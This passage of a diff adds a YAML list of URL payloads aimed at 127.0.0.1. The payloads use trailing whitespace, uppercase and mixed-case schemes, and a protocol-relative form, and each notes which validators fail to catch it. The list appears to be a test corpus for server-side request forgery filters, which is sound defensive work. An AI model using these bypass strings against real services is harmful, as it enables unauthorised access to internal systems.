+    description: "Leading spaces — legacy parsers strip, validators may not."
+    tags: ["legacy", "whitespace"]
+    severity_hint: "medium"
+
+  - id: "legacy-007"
+    name: "http:// with trailing whitespace"
+    category: "legacy"
+    payload: "http://127.0.0.1/   "
+    description: "Trailing spaces."
+    tags: ["legacy", "whitespace"]
+    severity_hint: "low"
+
+  - id: "legacy-008"
+    name: "Uppercase scheme"
+    category: "legacy"
+    payload: "HTTP://127.0.0.1/"
+    description: "Uppercase scheme — case-sensitive validators miss it."
+    tags: ["legacy", "case"]
+    severity_hint: "medium"
+
+  - id: "legacy-009"
+    name: "Mixed-case scheme"
+    category: "legacy"
+    payload: "HtTp://127.0.0.1/"
+    description: "Mixed case scheme."
+    tags: ["legacy", "case"]
+    severity_hint: "medium"
+
+  - id: "legacy-010"
+    name: "Protocol-relative URL"
+    category: "legacy"
+    payload: "//127.0.0.1/"
+    description: "Protocol-relative URL — inherits scheme from the page."
+    tags: ["legacy", "protocol-relative"]
+    severity_hint: "medium"
+
+# =============================================================================
+#  END
+# =============================================================================
